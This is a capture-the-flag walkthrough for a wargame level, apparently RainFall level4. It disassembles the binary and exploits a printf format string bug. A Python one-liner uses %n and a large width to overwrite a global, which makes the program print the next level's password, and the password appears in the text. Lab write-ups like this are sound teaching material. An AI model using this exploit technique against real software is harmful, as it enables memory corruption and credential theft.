# Walkthrough

After examining the contents of the home directory, I came across a binary file called "level4". Upon executing this binary, I noticed that it takes user input and outputs it.

```sh
level4@RainFall:~$ ./level4 
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
```

To further analyze the binary, I used the GDB debugger. In the "main" function of the binary, there is a call to the "n" function.

```c
   0x080484a7 <+0>:     push   ebp
   0x080484a8 <+1>:     mov    ebp,esp
   0x080484aa <+3>:     and    esp,0xfffffff0
   0x080484ad <+6>:     call   0x8048457 <n>
   0x080484b2 <+11>: leave  
   0x080484b3 <+12>: ret    
```

This "n" function uses the "fgets" function to read input from the user and store it in a buffer. It then calls the "p" function with the previously mentioned buffer, which then prints the input.

Additionally, the "n" function checks a condition to see if the value at memory address "0x8049810" is equal to "0x1025544". If this condition is true, the binary will execute the command "system("/bin/cat /home/user/level5/.pass")", which will output the contents of the ".pass" file for "level5". If this condition is false, the program does not take any further action.

The following code is the disassembled version of the "n" function:

```c
   0x08048457 <+0>:     push   ebp
   0x08048458 <+1>:     mov    ebp,esp
   0x0804845a <+3>:     sub    esp,0x218
   0x08048460 <+9>:     mov    eax,ds:0x8049804
   0x08048465 <+14>: mov    DWORD PTR [esp+0x8],eax
   0x08048469 <+18>: mov    DWORD PTR [esp+0x4],0x200
   0x08048471 <+26>: lea    eax,[ebp-0x208]
   0x08048477 <+32>: mov    DWORD PTR [esp],eax
   0x0804847a <+35>: call   0x8048350 <fgets@plt>
   0x0804847f <+40>: lea    eax,[ebp-0x208]
   0x08048485 <+46>: mov    DWORD PTR [esp],eax
   0x08048488 <+49>: call   0x8048444 <p>
   0x0804848d <+54>: mov    eax,ds:0x8049810
   0x08048492 <+59>: cmp    eax,0x1025544
   0x08048497 <+64>: jne    0x80484a5 <n+78>
   0x08048499 <+66>: mov    DWORD PTR [esp],0x8048590
   0x080484a0 <+73>: call   0x8048360 <system@plt>
   0x080484a5 <+78>: leave  
   0x080484a6 <+79>: ret    
```

The following code is the disassembled version of the "p" function:

```c
   0x08048444 <+0>:  push   ebp
   0x08048445 <+1>:  mov    ebp,esp
   0x08048447 <+3>:  sub    esp,0x18
   0x0804844a <+6>:  mov    eax,DWORD PTR [ebp+0x8]
   0x0804844d <+9>:  mov    DWORD PTR [esp],eax
   0x08048450 <+12>: call   0x8048340 <printf@plt>
   0x08048455 <+17>: leave  
   0x08048456 <+18>: ret  
```

Upon closer inspection, this level is similar to the previous one. The goal is to change the value at memory address "0x8049810" to the value 0x1025544, which can be done using a format string vulnerability. First, we need to determine the locations of the address using the %x conversion specifier.

```sh
level4@RainFall:~$ ./level4 
AAAA %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x  %x
AAAA b7ff26b0  bffff684  b7fd0ff4  0  0  bffff648  804848d  bffff440  200  b7fd1ac0  b7ff37d0  41414141  20782520  20782520  20782520
```

To overwrite the memory location at address 0x8049810, we can replace the "AAAA" placeholder with this address and use the %n conversion specifier instead of %x in the 12th conversion. This will write the number of characters printed so far to the memory location, effectively changing its value. We can then examine the disassembled code to see the effects of this change.

To carry out this task, i gonna use the Python programming language. We will write a script to generate the format string that will exploit the vulnerability and overwrite the memory location with the desired value.

```sh
level4@RainFall:~$ python2 -c 'print("\x08\x04\x98\x10"[::-1] + " "  + "%x " * 11 + "%n")' > /tmp/flag
level4@RainFall:~$ cat /tmp/flag
 %x %x %x %x %x %x %x %x %x %x %x %n
```

before `%n` converstion:

```c
0x8048492 <n+59>: cmp    eax,0x1025544
eax            0x0 0
```

after `%n` convertion:

```
0x8048492 <n+59>: cmp    eax,0x1025544
eax            0x54 84
```

Taking into account the information presented above, and factoring in the result below, it can be concluded that:

```sh
level4@RainFall:~$ cat /tmp/flag | ./level4 
||| |b7ff26b0 |bffff684 |b7fd0ff4 |0 |0 |bffff648 |804848d |bffff440 |200 |b7fd1ac0 |b7ff37d0 |
|4||1|    9   |    9    |    9    |2 |2 |    9    |    8   |    9    | 4  |    9    |    9    | // result = 84 <=> 0x54
```

After analyzing the situation, we have determined that we need an additional 16930032 bytes because 0x1025544 - 0x54  = 16930032. To add these bytes using the concept of width in printf, we can use the number 16930032 after the percentage sign, which tells printf to add 16930032 characters. However, the issue with using width is that it calculates the length of the value being printed, subtracts it from the width, and then pads the result with spaces. To compensate for this, we will add 8 to the 16930032 characters `(16930040)`to make the total length equal to 0x1025544`(16930116 in decimal)`.

```sh
level4@RainFall:~$ python2 -c 'print("\x08\x04\x98\x10"[::-1] + " " +  "%x " * 10 + "%16930040x " + "%n")' > /tmp/flag
level4@RainFall:~$ cat /tmp/flag | ./level4
 b7ff26b0 bffff684 b7fd0ff4 0 0 bffff648 804848d bffff440 200 b7fd1ac0 (after 16930032 space)b7ff37d0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a // the pass of level5
```

And with that, we have successfully obtained the password for level 5.
